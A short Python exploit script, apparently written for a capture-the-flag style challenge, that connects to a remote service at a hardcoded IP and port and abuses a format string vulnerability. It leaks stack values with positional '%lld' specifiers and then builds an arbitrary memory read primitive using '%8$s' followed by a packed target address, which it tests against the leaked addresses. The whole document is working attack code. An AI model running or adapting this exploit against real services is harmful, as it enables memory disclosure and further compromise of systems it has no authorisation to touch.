#!/usr/bin/env python3
import socket, time, re, struct
HOST="144.79.188.39"; PORT=43642
s=socket.socket(); s.settimeout(1.0); s.connect((HOST,PORT)); s.recv(300)
def ask(fmt):
    if isinstance(fmt,str): fmt=fmt.encode()
    s.send(fmt+b"\n"); time.sleep(0.08)
    try: return s.recv(4096)
    except Exception: return b'<T>'

def leak_lld(n):
    d=ask("%%%d$lld" % n)
    m=re.search(rb'([0-9-]+)\n',d)
    return int(m.group(1)) if m else None

# leak key bases on this connection
B = leak_lld(2)            # buffer
a1 = leak_lld(1)
a4 = leak_lld(4)
a21 = leak_lld(21)
a14 = leak_lld(14)
print(f"B(buffer)={hex(B)} arg1={hex(a1&((1<<64)-1))} arg4={hex(a4&((1<<64)-1))} arg21={hex(a21&((1<<64)-1))} arg14={hex(a14&((1<<64)-1))}")

# arbitrary read helper: read string at address X
def readmem(X):
    fmt = b"%8$s" + b"AAAA" + struct.pack("<Q", X)
    d = ask(fmt)
    # output starts with the string at X, then "AAAA"+X bytes then NUL-stop
    return d

# validate: read from buffer address B -> should echo our own format bytes
print("read(B):", repr(readmem(B)))
# read from arg4 (likely a code/return address -> string at that addr)
print("read(arg4):", repr(readmem(a4 & ((1<<64)-1))))
s.close()
